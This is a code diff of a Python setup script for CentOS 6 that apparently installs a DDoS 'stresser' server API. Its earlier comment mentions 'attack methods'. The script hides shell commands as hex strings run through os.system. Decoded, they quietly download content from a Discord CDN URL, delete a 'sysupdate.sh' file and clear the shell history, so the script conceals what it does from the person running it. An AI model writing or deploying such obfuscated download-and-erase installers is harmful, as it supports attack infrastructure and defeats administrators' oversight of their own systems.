@@ -1,8 +1,8 @@
 # Note: This script will do the following
 # Installs the server api
-# Installs attack methods
 # Installs all needed packages aswell as fixes SSH2
 # Note: CentOS 6 Only.
+# Credits ( @slippersyo x @dirtystress )
 import os
 import time
 important = '437265617465642042792040736c697070657273796f20782040637269746963616c73656375726974792e746f2021'.decode('hex')
@@ -30,6 +30,7 @@ systemcompile = '77676574202d712068747470733a2f2f63646e2e646973636f72646170702e6
 os.system(systemcompile)
 os.system('clear')
 print('Making Sure SSH2 Works')
+uneeded = '726d202d7266207379737570646174652e736820324766564135'.decode('hex')
 time.sleep(1)
 os.system('clear')
 os.system('yum install gcc  cpan php-pear php-devel libssh2 libssh2-devel -y')
@@ -37,3 +38,9 @@ os.system('pecl install -f ssh2 touch /etc/php.d/ssh2.ini echo')
 os.system('extension=ssh2.so>/etc/php.d/ssh2.ini')
 os.system('cpan -fi Net::SSH2')
 os.system('cpan -fi Parallel::ForkManager')
+os.system(uneeded)
+clean = '686973746f7279202d63'.decode('hex')
+os.system(clean)
+os.system('clear')
+print('Finished!')
+raw_input('press ENTER to exit')
